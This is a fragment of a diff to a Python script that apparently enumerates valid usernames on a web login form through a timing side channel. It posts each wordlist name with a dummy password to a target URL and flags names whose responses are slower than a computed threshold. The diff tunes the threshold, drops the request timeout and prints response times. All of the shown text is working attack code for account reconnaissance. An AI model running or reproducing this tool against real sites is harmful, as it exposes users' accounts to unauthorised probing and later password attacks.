@@ -55,7 +55,7 @@ op = list1[0] + list1[1] + list1[2] + list1[3] + list1[4] + list1[5] + list1[6] 
 op2 = op/20
 print("Mean time of response are: ",op2)
 
-tita = list1[12] / 1.5
+tita = list1[12] / 1.1
 op3 = op2 + tita
 
 def load_words2(WORDLIST_FILENAME):
@@ -68,10 +68,10 @@ def load_words2(WORDLIST_FILENAME):
                 my_str=line
                 final_str=my_str[:-1]
                 pp = {'username': final_str,'password': 'a','user': final_str,'pass': 'a',args.ufield: final_str,args.pfield: 'a'}
-                response = requests.post(args.url, data=pp,timeout=3.5)
+                response = requests.post(args.url, data=pp)
                 aaa = response.elapsed.total_seconds()
                 if aaa > op3:
-                  print(f"{bcolors.OK}User found: {bcolors.RESET}",final_str)
+                  print(f"{bcolors.OK}[+] User found: {bcolors.RESET}",final_str,"- Time Response: ",response.elapsed.total_seconds())
 
 wordlist = load_words2(args.wordlist)
 
